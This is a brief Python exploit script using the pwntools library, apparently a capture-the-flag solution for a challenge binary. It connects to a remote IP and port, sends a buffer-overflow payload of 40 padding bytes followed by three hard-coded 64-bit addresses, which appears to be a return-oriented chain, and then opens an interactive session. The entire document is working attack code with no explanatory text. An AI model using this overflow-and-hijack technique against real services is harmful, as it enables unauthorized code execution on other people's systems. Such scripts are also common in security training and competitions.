from pwn import *
#io = process('challenge1')
io  = remote('46.101.107.117',2112)
io.recvuntil('name!', drop=True)
payload = 40 * b'A' + p64(0x4007bf) +p64(0x6010b1) + p64(0x4007cc)
io.sendline(payload)
io.interactive()